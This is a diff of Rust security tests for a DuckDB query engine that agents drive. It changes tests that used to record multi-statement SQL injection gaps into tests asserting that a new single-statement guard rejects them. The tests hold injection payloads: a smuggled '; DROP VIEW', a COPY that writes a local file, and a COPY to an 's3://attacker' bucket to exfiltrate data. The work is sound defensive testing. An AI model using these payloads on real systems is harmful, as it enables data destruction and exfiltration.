@@ -13,19 +13,18 @@ use monty::MontyObject;
 mod tests {
     use super::*;
 
-    /// `CANARY` (was PROBE) — FINDING: execute_batch multi-statement in new_view lets a WHERE fragment run a second DDL statement via `;`.
-    /// OBSERVED: filter_rows WHERE '1=1; DROP VIEW ds_0' succeeds (r.is_ok()), the injected DROP fires.
-    /// ORIGINAL INTENT (desired contract): r.is_err() — the CREATE VIEW wrap must contain the fragment (single-statement only).
-    /// REFERENCES EXISTING GAP: same multi-statement execute_batch sink documented in writes_ddl.rs (Task 5 finding: new_view uses execute_batch).
-    /// FINDING: multi-stmt injection reaches a NEW attack vector (DDL DROP via filter WHERE) through the same root cause.
-    /// seam: engine_duckdb.rs new_view() execute_batch — filter_rows funnels WHERE {where_sql} through CREATE VIEW ds_n AS SELECT * FROM ds_k WHERE <frag>
+    /// `HOLDS` — FIXED 2026-06-26: a `;`-smuggled second DDL statement in a filter WHERE fragment is
+    /// rejected. new_view's single-statement guard (`is_single_statement`) refuses the composed SQL,
+    /// so the injected `; DROP VIEW ds_0` never reaches the engine. Same root cause / same fix as the
+    /// writes_ddl multistatement canaries.
+    /// seam: engine_duckdb.rs new_view() single-statement guard — filter_rows funnels WHERE {where_sql} through CREATE VIEW ds_n AS SELECT * FROM ds_k WHERE <frag>; a ';' in the fragment makes it multi-statement and is rejected.
     #[test]
-    fn known_gap_multistmt_injection_via_filter_executes_arbitrary_ddl() {
+    fn multistmt_injection_via_filter_is_rejected() {
         let dir = tmp_dir("mstmt-ddl");
         let p = sales_parquet(&dir);
         let mut s = Session::new("mstmt-ddl").unwrap();
         // Register two views: ds_0 (victim) and ds_1. The injected `; DROP VIEW ds_0` rides the
-        // filter_rows WHERE fragment; new_view's execute_batch runs BOTH statements.
+        // filter_rows WHERE fragment; the single-statement guard rejects the whole composed SQL.
         s.run_code(&format!("victim = register({p:?})")).unwrap();
         let h = s.run_code(&format!("register({p:?})")).unwrap();
         assert!(matches!(h, MontyObject::Int(_)));
@@ -33,22 +32,18 @@ mod tests {
             "filter_rows(register({p:?}), '1=1; DROP VIEW ds_0')"
         ));
         let _ = std::fs::remove_dir_all(&dir);
-        // CANARY: asserts OBSERVED (gap) behavior — multi-stmt injection via filter WHERE succeeds today.
-        // DESIRED (when fixed): r.is_err(). Fix: new_view must use conn.execute() (single statement), not execute_batch.
         assert!(
-            r.is_ok(),
-            "KNOWN-GAP canary: multi-statement injection via filter WHERE currently succeeds — execute_batch in new_view runs the second DDL (DROP) statement. Flips to is_err() when new_view is fixed to use single-statement execute()."
+            r.is_err(),
+            "multi-statement injection via filter WHERE must be rejected (single-statement guard); the injected DROP must never run"
         );
     }
 
-    /// `CANARY` (was PROBE) — FINDING: query() agent SQL is NOT parenthesized in the CREATE VIEW wrap, so a trailing `;COPY` statement executes and writes a local file.
-    /// OBSERVED: wrote==true (the COPY TO file succeeds), r.is_ok() — the multi-statement slips through execute_batch.
-    /// ORIGINAL INTENT (desired contract): wrote==false — the CREATE VIEW wrap must parenthesize agent SQL so `;` is a parse error.
-    /// REFERENCES EXISTING GAP: same execute_batch multi-statement sink as writes_ddl.rs / new_view finding (Task 5). This confirms query() is an additional entry point.
-    /// FINDING: query() is a DISTINCT write-escape entry point (separate from direct handle-tool injection) because local_sql omits the parens.
-    /// seam: tools.rs query() -> engine.local_sql(): CREATE VIEW ds_n AS WITH data AS (...) <agent_sql> (NO outer parens around agent sql)
+    /// `HOLDS` — FIXED 2026-06-26: a trailing `;COPY` statement smuggled through query() no longer
+    /// writes a local file. new_view's single-statement guard rejects the composed multi-statement
+    /// SQL before it reaches the engine, so the COPY never runs and no file is written.
+    /// seam: tools.rs query() -> engine.local_sql(): CREATE VIEW ds_n AS WITH data AS (...) <agent_sql>; the ';'-smuggled COPY makes it multi-statement and the guard rejects it.
     #[test]
-    fn known_gap_query_wrap_is_not_parenthesized_multistmt_copy_writes() {
+    fn multistmt_query_copy_write_is_blocked() {
         let dir = tmp_dir("query-mstmt");
         let p = sales_parquet(&dir);
         let leak = dir.join("query_leak.csv");
@@ -56,19 +51,20 @@ mod tests {
         let _ = std::fs::remove_file(&leak);
         let mut s = Session::new("query-mstmt").unwrap();
         // query()'s agent SQL is spliced as: CREATE VIEW ds_1 AS WITH data AS (SELECT * FROM ds_0) <sql>
-        // A self-contained second statement (COPY of a literal SELECT) executes via execute_batch.
+        // The self-contained second statement (COPY of a literal SELECT) is rejected by the guard.
         let sql =
             format!("SELECT * FROM data; COPY (SELECT 1) TO '{leak_s}' (HEADER, DELIMITER ',')");
         let code = format!("query({p:?}, {sql:?})");
         let r = s.run_code(&code);
         let wrote = leak.exists();
         let _ = std::fs::remove_dir_all(&dir);
-        let _ = r;
-        // CANARY: asserts OBSERVED (gap) behavior — COPY TO local file succeeds today via execute_batch.
-        // DESIRED (when fixed): wrote==false. Fix: local_sql must wrap agent SQL in parens (AS (<sql>)) so `;` is a parse error.
         assert!(
-            wrote,
-            "KNOWN-GAP canary: query() multi-statement COPY TO a local file currently SUCCEEDS via execute_batch; the CREATE VIEW wrap does not parenthesize agent SQL. Flips to !wrote when local_sql parenthesizes the agent subquery."
+            r.is_err(),
+            "multi-statement COPY via query() must be rejected (single-statement guard); got {r:?}"
+        );
+        assert!(
+            !wrote,
+            "query() multi-statement COPY TO must NOT write a local file — the COPY never ran"
         );
     }
 
@@ -298,21 +294,25 @@ mod tests {
         );
     }
 
-    /// `HOLDS` — Pairs with the multi-statement WRITE finding to isolate the blast radius: the same multi-statement gadget that writes a local file is still walled off from network egress — a distinct contract (egress) on the same gadget.
-    /// seam: engine_duckdb.rs new_view execute_batch multi-statement vs invariant #3 egress latch
+    /// `HOLDS` — Defense in depth for a multi-statement COPY-to-s3: it is now refused TWICE over. As of
+    /// 2026-06-26 the single-statement guard in new_view rejects the `;`-smuggled COPY before it reaches
+    /// the engine; even if that guard were removed, the disabled_filesystems one-way latch would still
+    /// refuse `COPY ... TO 's3://...'` with no network round-trip. Either layer alone makes this `is_err()`.
+    /// seam: engine_duckdb.rs new_view single-statement guard (primary) + invariant #3 egress latch (backstop)
     #[test]
     fn multistmt_injection_cannot_egress_to_s3_holds() {
         let dir = tmp_dir("mstmt-egress");
         let p = sales_parquet(&dir);
         let mut s = Session::new("mstmt-egress").unwrap();
-        // Multi-statement injection that tries to COPY out to s3 — must be refused by the disabled-filesystems latch.
+        // Multi-statement injection that tries to COPY out to s3 — rejected by the single-statement
+        // guard, and independently walled off from the network by the disabled-filesystems latch.
         let sql = "SELECT * FROM data; COPY (SELECT 1) TO 's3://attacker/leak.csv'";
         let code = format!("query({p:?}, {sql:?})");
         let r = s.run_code(&code);
         let _ = std::fs::remove_dir_all(&dir);
         assert!(
             r.is_err(),
-            "EGRESS CONTRACT HOLDS: even with the multi-statement COPY-write bypass, COPY ... TO 's3://...' is refused by the disabled_filesystems latch (no httpfs autoload). The injection can write LOCAL files but cannot reach the network."
+            "EGRESS CONTRACT HOLDS: a multi-statement COPY ... TO 's3://...' is rejected by the single-statement guard, and would be refused by the disabled_filesystems latch even without it — no network round-trip either way."
         );
     }
 
@@ -333,8 +333,11 @@ mod tests {
         );
     }
 
-    /// `HOLDS` — Negative-space probe distinguishing two write vectors: statement-in-expression (rejected, HOLDS) vs statement-after-semicolon (executes, the finding). Sharpens the root cause to execute_batch, not the splice.
-    /// seam: engine_duckdb.rs filter_rows WHERE {where_sql} — single-statement parser boundary (statement-in-expression)
+    /// `HOLDS` — Independent of the multi-statement `;` path (now closed by the single-statement guard),
+    /// a COPY pushed into an EXPRESSION position inside a WHERE fragment — WITHOUT a `;` — is rejected by
+    /// the DuckDB parser itself: COPY is not a valid sub-expression. So the WHERE-fragment splice cannot
+    /// write a file by either route.
+    /// seam: engine_duckdb.rs filter_rows WHERE {where_sql} — parser boundary (statement-in-expression)
     #[test]
     fn filter_where_copy_to_inside_expression_is_rejected_holds() {
         let dir = tmp_dir("filter-copy");
@@ -344,9 +347,8 @@ mod tests {
         let _ = std::fs::remove_file(&leak);
         let mut s = Session::new("filter-copy").unwrap();
         // Smuggle a COPY (a statement) into an EXPRESSION position inside WHERE, WITHOUT a `;` separator.
-        // DuckDB rejects COPY as a sub-expression, so this single-statement path cannot write — the write
-        // only happens via the multi-statement `;` bug. Use a self-contained COPY (SELECT 1) so the ONLY
-        // failure reason is the parser, not an unknown table name.
+        // DuckDB rejects COPY as a sub-expression, so this path cannot write regardless of the `;` guard.
+        // Use a self-contained COPY (SELECT 1) so the ONLY failure reason is the parser, not an unknown table.
         let where_sql = format!("(COPY (SELECT 1) TO '{leak_s}')");
         let code = format!("to_rows(filter_rows(register({p:?}), {where_sql:?}))");
         let r = s.run_code(&code);
@@ -354,7 +356,7 @@ mod tests {
         let _ = std::fs::remove_dir_all(&dir);
         assert!(
             r.is_err() && !wrote,
-            "WRITE CONTRACT (single-statement): a COPY/statement cannot be smuggled into an EXPRESSION position inside a WHERE fragment — the parser rejects it and no file is written. This isolates the write escape to the multi-statement ';' path, not the fragment-as-expression path."
+            "WRITE CONTRACT: a COPY/statement cannot be smuggled into an EXPRESSION position inside a WHERE fragment — the parser rejects it and no file is written, independent of the (now-closed) multi-statement ';' path."
         );
     }
 
